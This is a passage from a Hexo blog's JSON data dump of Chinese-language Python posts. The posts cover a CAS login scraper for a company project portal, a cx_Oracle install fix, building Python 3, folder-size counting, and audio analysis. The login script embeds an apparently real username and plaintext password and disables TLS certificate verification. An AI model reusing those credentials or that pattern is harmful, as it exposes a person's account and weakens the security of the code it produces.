'<input type=\\\"hidden\\\" name=\\\"lt\\\" value=\\\"(.*?)\\\" \\/>'\r\nrule2 = '<input type=\"hidden\" name=\"execution\" value=\"(.*?)\" \\/>'\r\nrule3 = '<input type=\\\"hidden\\\" name=\\\"_eventId\\\" value=\\\"(.*?)\\\" \\/>'\r\n\r\npatten1 = re.compile(rule1, re.S)\r\npatten2 = re.compile(rule2, re.S)\r\npatten3 = re.compile(rule3, re.S)\r\n\r\narray1 = re.findall(patten1, html.text)\r\narray2 = re.findall(patten2, html.text)\r\narray3 = re.findall(patten3, html.text)\r\nloginParams = {\r\n    'username': 'hanqian18790',\r\n    'password': 'hanQIAN1993',\r\n    'lt': array1[0],\r\n    'execution': array2[0],\r\n    '_eventId': array3[0]\r\n}\r\nsessionHtml = s.post(login_url, data=loginParams, verify=False)\r\n\r\nprint(\"the session rsult is: \", sessionHtml.status_code)\r\nprint(\"the reason is: \", sessionHtml.reason)\r\n\r\nindexhtml = s.get('http://pm.hundsun.com/main.do', headers=header_login, verify=False)\r\n\r\n\r\nr = random.random()\r\ncontent = s.get(\r\n    'http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&action=0&keepOperate=N&r='+str(r)\r\n    , headers=header_info, verify=False)\r\nprint('------->', content.status_code)\r\nprint('------->', content.text)\r\n","source":"_posts/python/work.md","raw":"---\ntitle: work\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\r\n# -*- coding:utf-8 -*-\r\nimport requests\r\nimport re\r\nimport random\r\n\r\nheader_login = {\r\n    'Host': 'hs-cas.hundsun.com',\r\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',\r\n    'Upgrade-Insecure-Requests': '1',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, sdch',\r\n    'Connection': 'keep-alive',\r\n    'Cache-Control': 'max-age=0'\r\n}\r\n\r\nheader_info = {\r\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',\r\n    'Upgrade-Insecure-Requests': '1',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, sdch',\r\n    'Referer': '127.0.0.1:8888',\r\n    'Connection': 'keep-alive',\r\n    'Cache-Control': 'max-age=0'\r\n}\r\n\r\nlogin_url = 'https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check'\r\ns = requests.Session()\r\n# html = s.get(login_url, headers=header)\r\n\r\nhtml = s.get(login_url, headers=header_login, verify=False)\r\n# print(html)\r\nprint('结果：', html.status_code)\r\nprint('原因：', html.reason)\r\n\r\nrule1 = '<input type=\\\"hidden\\\" name=\\\"lt\\\" value=\\\"(.*?)\\\" \\/>'\r\nrule2 = '<input type=\"hidden\" name=\"execution\" value=\"(.*?)\" \\/>'\r\nrule3 = '<input type=\\\"hidden\\\" name=\\\"_eventId\\\" value=\\\"(.*?)\\\" \\/>'\r\n\r\npatten1 = re.compile(rule1, re.S)\r\npatten2 = re.compile(rule2, re.S)\r\npatten3 = re.compile(rule3, re.S)\r\n\r\narray1 = re.findall(patten1, html.text)\r\narray2 = re.findall(patten2, html.text)\r\narray3 = re.findall(patten3, html.text)\r\nloginParams = {\r\n    'username': 'hanqian18790',\r\n    'password': 'hanQIAN1993',\r\n    'lt': array1[0],\r\n    'execution': array2[0],\r\n    '_eventId': array3[0]\r\n}\r\nsessionHtml = s.post(login_url, data=loginParams, verify=False)\r\n\r\nprint(\"the session rsult is: \", sessionHtml.status_code)\r\nprint(\"the reason is: \", sessionHtml.reason)\r\n\r\nindexhtml = s.get('http://pm.hundsun.com/main.do', headers=header_login, verify=False)\r\n\r\n\r\nr = random.random()\r\ncontent = s.get(\r\n    'http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&action=0&keepOperate=N&r='+str(r)\r\n    , headers=header_info, verify=False)\r\nprint('------->', content.status_code)\r\nprint('------->', content.text)\r\n","slug":"python/work","published":1,"updated":"2018-07-10T13:10:09.969Z","_id":"cjjedmhbl00710gtjue70gx01","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re<br>import random</p>\n<p>header_login = {<br>    ‘Host’: ‘hs-cas.hundsun.com’,<br>    ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36’,<br>    ‘Upgrade-Insecure-Requests’: ‘1’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, sdch’,<br>    ‘Connection’: ‘keep-alive’,<br>    ‘Cache-Control’: ‘max-age=0’<br>}</p>\n<p>header_info = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36’,<br>    ‘Upgrade-Insecure-Requests’: ‘1’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, sdch’,<br>    ‘Referer’: ‘127.0.0.1:8888’,<br>    ‘Connection’: ‘keep-alive’,<br>    ‘Cache-Control’: ‘max-age=0’<br>}</p>\n<p>login_url = ‘<a href=\"https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check&#39;\" target=\"_blank\" rel=\"noopener\">https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check&#39;</a><br>s = requests.Session()</p>\n<h1 id=\"html-s-get-login-url-headers-header\"><a href=\"#html-s-get-login-url-headers-header\" class=\"headerlink\" title=\"html = s.get(login_url, headers=header)\"></a>html = s.get(login_url, headers=header)</h1><p>html = s.get(login_url, headers=header_login, verify=False)</p>\n<h1 id=\"print-html\"><a href=\"#print-html\" class=\"headerlink\" title=\"print(html)\"></a>print(html)</h1><p>print(‘结果：’, html.status_code)<br>print(‘原因：’, html.reason)</p>\n<p>rule1 = ‘<input type=\"\\\"hidden\\\"\" name=\"\\\"lt\\\"\" value=\"\\\"(.*?)\\\"\" \\=\"\">‘<br>rule2 = ‘<input type=\"hidden\" name=\"execution\" value=\"(.*?)\" \\=\"\">‘<br>rule3 = ‘<input type=\"\\\"hidden\\\"\" name=\"\\\"_eventId\\\"\" value=\"\\\"(.*?)\\\"\" \\=\"\">‘</p>\n<p>patten1 = re.compile(rule1, re.S)<br>patten2 = re.compile(rule2, re.S)<br>patten3 = re.compile(rule3, re.S)</p>\n<p>array1 = re.findall(patten1, html.text)<br>array2 = re.findall(patten2, html.text)<br>array3 = re.findall(patten3, html.text)<br>loginParams = {<br>    ‘username’: ‘hanqian18790’,<br>    ‘password’: ‘hanQIAN1993’,<br>    ‘lt’: array1[0],<br>    ‘execution’: array2[0],<br>    ‘_eventId’: array3[0]<br>}<br>sessionHtml = s.post(login_url, data=loginParams, verify=False)</p>\n<p>print(“the session rsult is: “, sessionHtml.status_code)<br>print(“the reason is: “, sessionHtml.reason)</p>\n<p>indexhtml = s.get(‘<a href=\"http://pm.hundsun.com/main.do&#39;\" target=\"_blank\" rel=\"noopener\">http://pm.hundsun.com/main.do&#39;</a>, headers=header_login, verify=False)</p>\n<p>r = random.random()<br>content = s.get(<br>    ‘<a href=\"http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&amp;action=0&amp;keepOperate=N&amp;r=&#39;+str(r)\" target=\"_blank\" rel=\"noopener\">http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&amp;action=0&amp;keepOperate=N&amp;r=&#39;+str(r)</a><br>    , headers=header_info, verify=False)<br>print(‘——-&gt;’, content.status_code)<br>print(‘——-&gt;’, content.text)</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re<br>import random</p>\n<p>header_login = {<br>    ‘Host’: ‘hs-cas.hundsun.com’,<br>    ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36’,<br>    ‘Upgrade-Insecure-Requests’: ‘1’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, sdch’,<br>    ‘Connection’: ‘keep-alive’,<br>    ‘Cache-Control’: ‘max-age=0’<br>}</p>\n<p>header_info = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36’,<br>    ‘Upgrade-Insecure-Requests’: ‘1’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, sdch’,<br>    ‘Referer’: ‘127.0.0.1:8888’,<br>    ‘Connection’: ‘keep-alive’,<br>    ‘Cache-Control’: ‘max-age=0’<br>}</p>\n<p>login_url = ‘<a href=\"https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check&#39;\" target=\"_blank\" rel=\"noopener\">https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check&#39;</a><br>s = requests.Session()</p>\n<h1 id=\"html-s-get-login-url-headers-header\"><a href=\"#html-s-get-login-url-headers-header\" class=\"headerlink\" title=\"html = s.get(login_url, headers=header)\"></a>html = s.get(login_url, headers=header)</h1><p>html = s.get(login_url, headers=header_login, verify=False)</p>\n<h1 id=\"print-html\"><a href=\"#print-html\" class=\"headerlink\" title=\"print(html)\"></a>print(html)</h1><p>print(‘结果：’, html.status_code)<br>print(‘原因：’, html.reason)</p>\n<p>rule1 = ‘<input type=\"\\\"hidden\\\"\" name=\"\\\"lt\\\"\" value=\"\\\"(.*?)\\\"\" \\=\"\">‘<br>rule2 = ‘<input type=\"hidden\" name=\"execution\" value=\"(.*?)\" \\=\"\">‘<br>rule3 = ‘<input type=\"\\\"hidden\\\"\" name=\"\\\"_eventId\\\"\" value=\"\\\"(.*?)\\\"\" \\=\"\">‘</p>\n<p>patten1 = re.compile(rule1, re.S)<br>patten2 = re.compile(rule2, re.S)<br>patten3 = re.compile(rule3, re.S)</p>\n<p>array1 = re.findall(patten1, html.text)<br>array2 = re.findall(patten2, html.text)<br>array3 = re.findall(patten3, html.text)<br>loginParams = {<br>    ‘username’: ‘hanqian18790’,<br>    ‘password’: ‘hanQIAN1993’,<br>    ‘lt’: array1[0],<br>    ‘execution’: array2[0],<br>    ‘_eventId’: array3[0]<br>}<br>sessionHtml = s.post(login_url, data=loginParams, verify=False)</p>\n<p>print(“the session rsult is: “, sessionHtml.status_code)<br>print(“the reason is: “, sessionHtml.reason)</p>\n<p>indexhtml = s.get(‘<a href=\"http://pm.hundsun.com/main.do&#39;\" target=\"_blank\" rel=\"noopener\">http://pm.hundsun.com/main.do&#39;</a>, headers=header_login, verify=False)</p>\n<p>r = random.random()<br>content = s.get(<br>    ‘<a href=\"http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&amp;action=0&amp;keepOperate=N&amp;r=&#39;+str(r)\" target=\"_blank\" rel=\"noopener\">http://pm.hundsun.com/pages/task/entityTab.jsf?taskId=423c943d-85d7-4cf8-9ce0-7020ad064bc4&amp;action=0&amp;keepOperate=N&amp;r=&#39;+str(r)</a><br>    , headers=header_info, verify=False)<br>print(‘——-&gt;’, content.status_code)<br>print(‘——-&gt;’, content.text)</p>\n"},{"title":"安装cx_Oracle报错：unable to find vcvarsall.bat","date":"2018-07-10T13:09:19.000Z","_content":"#### 环境：\r\n> Python3.5\r\n>\r\n> vs 2008\r\n\r\n#### 报错：\r\n> unable to find vcvarsall.bat\r\n\r\n#### 原因：\r\n\r\n*python的distutils模块中的msvc9compiler.py并不从环境变量指定的路径中寻找’vcvarsall.bat’，而是通过注册表来寻找…，然而，不知为什么编译器安装过程没有配置注册表。*\r\n\r\n#### 解决办法：\r\n\r\n网上有很多，但是都不能很快解决。\r\n\r\n## **终极牛逼方案：*安装最新版***\r\n> python -m pip install cx_Oracle --pre","source":"_posts/python/安装cx_Oracle报错：unable to find vcvarsall.bat.md","raw":"---\ntitle: 安装cx_Oracle报错：unable to find vcvarsall.bat\ndate: 2018-07-10 21:09:19\ntags: python\n---\n#### 环境：\r\n> Python3.5\r\n>\r\n> vs 2008\r\n\r\n#### 报错：\r\n> unable to find vcvarsall.bat\r\n\r\n#### 原因：\r\n\r\n*python的distutils模块中的msvc9compiler.py并不从环境变量指定的路径中寻找’vcvarsall.bat’，而是通过注册表来寻找…，然而，不知为什么编译器安装过程没有配置注册表。*\r\n\r\n#### 解决办法：\r\n\r\n网上有很多，但是都不能很快解决。\r\n\r\n## **终极牛逼方案：*安装最新版***\r\n> python -m pip install cx_Oracle --pre","slug":"python/安装cx_Oracle报错：unable to find vcvarsall.bat","published":1,"updated":"2018-07-10T13:10:09.972Z","_id":"cjjedmhbm00730gtjmi1ure19","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"环境：\"><a href=\"#环境：\" class=\"headerlink\" title=\"环境：\"></a>环境：</h4><blockquote>\n<p>Python3.5</p>\n<p>vs 2008</p>\n</blockquote>\n<h4 id=\"报错：\"><a href=\"#报错：\" class=\"headerlink\" title=\"报错：\"></a>报错：</h4><blockquote>\n<p>unable to find vcvarsall.bat</p>\n</blockquote>\n<h4 id=\"原因：\"><a href=\"#原因：\" class=\"headerlink\" title=\"原因：\"></a>原因：</h4><p><em>python的distutils模块中的msvc9compiler.py并不从环境变量指定的路径中寻找’vcvarsall.bat’，而是通过注册表来寻找…，然而，不知为什么编译器安装过程没有配置注册表。</em></p>\n<h4 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h4><p>网上有很多，但是都不能很快解决。</p>\n<h2 id=\"终极牛逼方案：安装最新版\"><a href=\"#终极牛逼方案：安装最新版\" class=\"headerlink\" title=\"终极牛逼方案：安装最新版\"></a><strong>终极牛逼方案：<em>安装最新版</em></strong></h2><blockquote>\n<p>python -m pip install cx_Oracle –pre</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"环境：\"><a href=\"#环境：\" class=\"headerlink\" title=\"环境：\"></a>环境：</h4><blockquote>\n<p>Python3.5</p>\n<p>vs 2008</p>\n</blockquote>\n<h4 id=\"报错：\"><a href=\"#报错：\" class=\"headerlink\" title=\"报错：\"></a>报错：</h4><blockquote>\n<p>unable to find vcvarsall.bat</p>\n</blockquote>\n<h4 id=\"原因：\"><a href=\"#原因：\" class=\"headerlink\" title=\"原因：\"></a>原因：</h4><p><em>python的distutils模块中的msvc9compiler.py并不从环境变量指定的路径中寻找’vcvarsall.bat’，而是通过注册表来寻找…，然而，不知为什么编译器安装过程没有配置注册表。</em></p>\n<h4 id=\"解决办法：\"><a href=\"#解决办法：\" class=\"headerlink\" title=\"解决办法：\"></a>解决办法：</h4><p>网上有很多，但是都不能很快解决。</p>\n<h2 id=\"终极牛逼方案：安装最新版\"><a href=\"#终极牛逼方案：安装最新版\" class=\"headerlink\" title=\"终极牛逼方案：安装最新版\"></a><strong>终极牛逼方案：<em>安装最新版</em></strong></h2><blockquote>\n<p>python -m pip install cx_Oracle –pre</p>\n</blockquote>\n"},{"title":"安装python3","date":"2018-07-10T13:09:19.000Z","_content":"wget https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz\n\n tar -zxvf Python-3.6.3.tgz\n \n yum install gcc\n \n ```\n Installed:\n  gcc.x86_64 0:4.8.5-16.el7                                                                                                                                                                                       \n\nDependency Installed:\n  cpp.x86_64 0:4.8.5-16.el7   glibc-devel.x86_64 0:2.17-196.el7   glibc-headers.x86_64 0:2.17-196.el7   kernel-headers.x86_64 0:3.10.0-693.2.2.el7   libmpc.x86_64 0:1.0.1-3.el7   mpfr.x86_64 0:3.1.1-4.el7  \n\nDependency Updated:\n  glibc.x86_64 0:2.17-196.el7                      glibc-common.x86_64 0:2.17-196.el7                      libgcc.x86_64 0:4.8.5-16.el7                      libgomp.x86_64 0:4.8.5-16.el7                     \n\nComplete!\n ```\n\nyum install zlib zlib-devel\n\nyum install openssl openssl-devel\n\nvim Modules/Setup.dist\n ```\n \n# Andrew Kuchling's zlib module.\n# This require zlib 1.1.3 (or later).\n# See http://www.gzip.org/zlib/\nzlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz\n\n# Interface to the Expat XML parser\n#\n# Expat was written by James Clark and is now maintained by a group of\n ```\n ./configure \n \nmake && make install\n \nln -s /[path]/python3 python3\n ","source":"_posts/python/安装python3.md","raw":"---\ntitle: 安装python3\ndate: 2018-07-10 21:09:19\ntags: python\n---\nwget https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz\n\n tar -zxvf Python-3.6.3.tgz\n \n yum install gcc\n \n ```\n Installed:\n  gcc.x86_64 0:4.8.5-16.el7                                                                                                                                                                                       \n\nDependency Installed:\n  cpp.x86_64 0:4.8.5-16.el7   glibc-devel.x86_64 0:2.17-196.el7   glibc-headers.x86_64 0:2.17-196.el7   kernel-headers.x86_64 0:3.10.0-693.2.2.el7   libmpc.x86_64 0:1.0.1-3.el7   mpfr.x86_64 0:3.1.1-4.el7  \n\nDependency Updated:\n  glibc.x86_64 0:2.17-196.el7                      glibc-common.x86_64 0:2.17-196.el7                      libgcc.x86_64 0:4.8.5-16.el7                      libgomp.x86_64 0:4.8.5-16.el7                     \n\nComplete!\n ```\n\nyum install zlib zlib-devel\n\nyum install openssl openssl-devel\n\nvim Modules/Setup.dist\n ```\n \n# Andrew Kuchling's zlib module.\n# This require zlib 1.1.3 (or later).\n# See http://www.gzip.org/zlib/\nzlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz\n\n# Interface to the Expat XML parser\n#\n# Expat was written by James Clark and is now maintained by a group of\n ```\n ./configure \n \nmake && make install\n \nln -s /[path]/python3 python3\n ","slug":"python/安装python3","published":1,"updated":"2018-07-10T13:10:09.974Z","_id":"cjjedmhbn00750gtjrzftvfg6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>wget <a href=\"https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz\" target=\"_blank\" rel=\"noopener\">https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz</a></p>\n<p> tar -zxvf Python-3.6.3.tgz</p>\n<p> yum install gcc</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Installed:</span><br><span class=\"line\">  gcc.x86_64 0:4.8.5-16.el7                                                                                                                                                                                       </span><br><span class=\"line\"></span><br><span class=\"line\">Dependency Installed:</span><br><span class=\"line\">  cpp.x86_64 0:4.8.5-16.el7   glibc-devel.x86_64 0:2.17-196.el7   glibc-headers.x86_64 0:2.17-196.el7   kernel-headers.x86_64 0:3.10.0-693.2.2.el7   libmpc.x86_64 0:1.0.1-3.el7   mpfr.x86_64 0:3.1.1-4.el7  </span><br><span class=\"line\"></span><br><span class=\"line\">Dependency Updated:</span><br><span class=\"line\">  glibc.x86_64 0:2.17-196.el7                      glibc-common.x86_64 0:2.17-196.el7                      libgcc.x86_64 0:4.8.5-16.el7                      libgomp.x86_64 0:4.8.5-16.el7                     </span><br><span class=\"line\"></span><br><span class=\"line\">Complete!</span><br></pre></td></tr></table></figure>\n<p>yum install zlib zlib-devel</p>\n<p>yum install openssl openssl-devel</p>\n<p>vim Modules/Setup.dist<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"># Andrew Kuchling&apos;s zlib module.</span><br><span class=\"line\"># This require zlib 1.1.3 (or later).</span><br><span class=\"line\"># See http://www.gzip.org/zlib/</span><br><span class=\"line\">zlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz</span><br><span class=\"line\"></span><br><span class=\"line\"># Interface to the Expat XML parser</span><br><span class=\"line\">#</span><br><span class=\"line\"># Expat was written by James Clark and is now maintained by a group of</span><br></pre></td></tr></table></figure></p>\n<p> ./configure </p>\n<p>make &amp;&amp; make install</p>\n<p>ln -s /[path]/python3 python3</p>\n","site":{"data":{}},"excerpt":"","more":"<p>wget <a href=\"https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz\" target=\"_blank\" rel=\"noopener\">https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tgz</a></p>\n<p> tar -zxvf Python-3.6.3.tgz</p>\n<p> yum install gcc</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Installed:</span><br><span class=\"line\">  gcc.x86_64 0:4.8.5-16.el7                                                                                                                                                                                       </span><br><span class=\"line\"></span><br><span class=\"line\">Dependency Installed:</span><br><span class=\"line\">  cpp.x86_64 0:4.8.5-16.el7   glibc-devel.x86_64 0:2.17-196.el7   glibc-headers.x86_64 0:2.17-196.el7   kernel-headers.x86_64 0:3.10.0-693.2.2.el7   libmpc.x86_64 0:1.0.1-3.el7   mpfr.x86_64 0:3.1.1-4.el7  </span><br><span class=\"line\"></span><br><span class=\"line\">Dependency Updated:</span><br><span class=\"line\">  glibc.x86_64 0:2.17-196.el7                      glibc-common.x86_64 0:2.17-196.el7                      libgcc.x86_64 0:4.8.5-16.el7                      libgomp.x86_64 0:4.8.5-16.el7                     </span><br><span class=\"line\"></span><br><span class=\"line\">Complete!</span><br></pre></td></tr></table></figure>\n<p>yum install zlib zlib-devel</p>\n<p>yum install openssl openssl-devel</p>\n<p>vim Modules/Setup.dist<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"># Andrew Kuchling&apos;s zlib module.</span><br><span class=\"line\"># This require zlib 1.1.3 (or later).</span><br><span class=\"line\"># See http://www.gzip.org/zlib/</span><br><span class=\"line\">zlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz</span><br><span class=\"line\"></span><br><span class=\"line\"># Interface to the Expat XML parser</span><br><span class=\"line\">#</span><br><span class=\"line\"># Expat was written by James Clark and is now maintained by a group of</span><br></pre></td></tr></table></figure></p>\n<p> ./configure </p>\n<p>make &amp;&amp; make install</p>\n<p>ln -s /[path]/python3 python3</p>\n"},{"title":"计算一个目录页下所有文件夹的大小","date":"2018-07-10T13:09:19.000Z","_content":"```\nimport os\n\nhomedir = 'C:\\\\Users'\n\ndef get_size(filedir):\n    tree = os.walk(filedir, topdown=True)\n    dirsize = 0\n    for i in tree:\n        nodeName = i[0]\n        nodeDirs = i[1]\n        nodeFiles = i[2]\n        if('Zeal' in nodeName):\n            continue\n        for file in nodeFiles:\n            dirsize = dirsize + os.path.getsize(nodeName+'\\\\'+file)\n    return dirsize\n\ntree = os.walk(homedir, topdown=True)\nfor a,b,c in tree:\n    for d in b:\n        pass\n        print(d,' : ',get_size(a+'\\\\'+d)/1024/1024)\n    break\n","source":"_posts/python/计算一个目录页下所有文件夹的大小.md","raw":"---\ntitle: 计算一个目录页下所有文件夹的大小\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\nimport os\n\nhomedir = 'C:\\\\Users'\n\ndef get_size(filedir):\n    tree = os.walk(filedir, topdown=True)\n    dirsize = 0\n    for i in tree:\n        nodeName = i[0]\n        nodeDirs = i[1]\n        nodeFiles = i[2]\n        if('Zeal' in nodeName):\n            continue\n        for file in nodeFiles:\n            dirsize = dirsize + os.path.getsize(nodeName+'\\\\'+file)\n    return dirsize\n\ntree = os.walk(homedir, topdown=True)\nfor a,b,c in tree:\n    for d in b:\n        pass\n        print(d,' : ',get_size(a+'\\\\'+d)/1024/1024)\n    break\n","slug":"python/计算一个目录页下所有文件夹的大小","published":1,"updated":"2018-07-10T13:10:09.976Z","_id":"cjjedmhbo00770gtjrn8x32m7","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>import os</p>\n<p>homedir = ‘C:\\Users’</p>\n<p>def get_size(filedir):<br>    tree = os.walk(filedir, topdown=True)<br>    dirsize = 0<br>    for i in tree:<br>        nodeName = i[0]<br>        nodeDirs = i[1]<br>        nodeFiles = i[2]<br>        if(‘Zeal’ in nodeName):<br>            continue<br>        for file in nodeFiles:<br>            dirsize = dirsize + os.path.getsize(nodeName+’\\‘+file)<br>    return dirsize</p>\n<p>tree = os.walk(homedir, topdown=True)<br>for a,b,c in tree:<br>    for d in b:<br>        pass<br>        print(d,’ : ‘,get_size(a+’\\‘+d)/1024/1024)<br>    break</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>import os</p>\n<p>homedir = ‘C:\\Users’</p>\n<p>def get_size(filedir):<br>    tree = os.walk(filedir, topdown=True)<br>    dirsize = 0<br>    for i in tree:<br>        nodeName = i[0]<br>        nodeDirs = i[1]<br>        nodeFiles = i[2]<br>        if(‘Zeal’ in nodeName):<br>            continue<br>        for file in nodeFiles:<br>            dirsize = dirsize + os.path.getsize(nodeName+’\\‘+file)<br>    return dirsize</p>\n<p>tree = os.walk(homedir, topdown=True)<br>for a,b,c in tree:<br>    for d in b:<br>        pass<br>        print(d,’ : ‘,get_size(a+’\\‘+d)/1024/1024)<br>    break</p>\n"},{"title":"音频处理","date":"2018-07-10T13:09:19.000Z","_content":"网页录音    \nhttps://github.com/mattdiamond/Recorderjs\n\n格式转换，切割合并  \nhttps://github.com/jiaaro/pydub#installation\n\n音频分析    \nhttps://docs.python.org/3/library/wave.html\nhttp://bigsec.net/b52/scipydoc/wave_pyaudio.html\n\n```\nimport wave\nfrom matplotlib import pylab as pl\nimport numpy as np\nimport pydub\nfrom pydub import AudioSegment\n\npydub.AudioSegment.converter = r'ffmpeg.exe'\nsound = AudioSegment.from_mp3(r\"2018-05-09T09_40_04.301Z.mp3\")\nsound.export(\"test.wav\", format=\"wav\")\n\n\n# 打开WAV文档\nf = wave.open(r\"test.wav\", \"rb\")\n\n# 读取格式信息\n# (nchannels, sampwidth, framerate, nframes, comptype, compname)\nparams = f.getparams()\nnchannels, sampwidth, framerate, nframes = params[:4]\n\n# 读取波形数据\nstr_data = f.readframes(nframes)\nf.close()\n\n#将波形数据转换为数组\nwave_data = np.fromstring(str_data, dtype=np.short)\nwave_data.shape = -1, 2\nwave_data = wave_data.T\n# wave_data = wave_data[1]\ntime = np.arange(0, nframes) * (1.0 / framerate)\n\n# 绘制波形\npl.subplot(211)\npl.plot(time, wave_data[0])\npl.subplot(212)\npl.plot(time, wave_data[1], c=\"g\")\npl.xlabel(\"time (seconds)\")\npl.show()","source":"_posts/python/音频处理.md","raw":"---\ntitle: 音频处理\ndate: 2018-07-10 21:09:19\ntags: python\n---\n网页录音    \nhttps://github.com/mattdiamond/Recorderjs\n\n格式转换，切割合并  \nhttps://github.com/jiaaro/pydub#installation\n\n音频分析    \nhttps://docs.python.org/3/library/wave.html\nhttp://bigsec.net/b52/scipydoc/wave_pyaudio.html\n\n```\nimport 